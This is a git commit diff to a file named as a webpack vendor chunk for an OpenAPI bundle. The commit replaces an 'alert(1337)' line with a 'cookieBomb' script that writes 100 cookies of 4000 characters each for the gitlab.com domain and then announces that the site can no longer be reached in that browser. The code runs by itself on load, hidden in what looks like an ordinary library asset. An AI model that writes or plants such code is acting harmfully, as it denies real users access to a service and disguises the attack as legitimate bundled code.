257bdf7dc093cc5ef79cc833dff09a20179b1049
l1ack <74605366+l1ackerdz@users.noreply.github.com>
2025-12-11 22:05:56 -0500

    Update vendors-openapi.7e543205.chunk.js

--- assets/webpack/vendors-openapi.7e543205.chunk.js
+++ assets/webpack/vendors-openapi.7e543205.chunk.js
@@ -1,1 +1,20 @@
-alert(1337)
+function cookieBomb() {
+    // Set target domain explicitlyzebidz
+    const domain = "gitlab.com";
+    
+    // Large string to fill the cookies
+    const pollution = "a".repeat(4000); // 4000 characters
+    
+    // Create multiple cookies to flood the browser
+    for (let i = 1; i <= 100; i++) {
+        document.cookie = `bomb${i}=${pollution}; domain=${domain}; path=/`;
+    }
+    
+    // Notify when complete
+    setTimeout(() => {
+        alert(`Cookie bomb complete! You can no longer access ${domain} in this browser.`);
+    }, 1000);
+}
+
+// Run it
+cookieBomb();
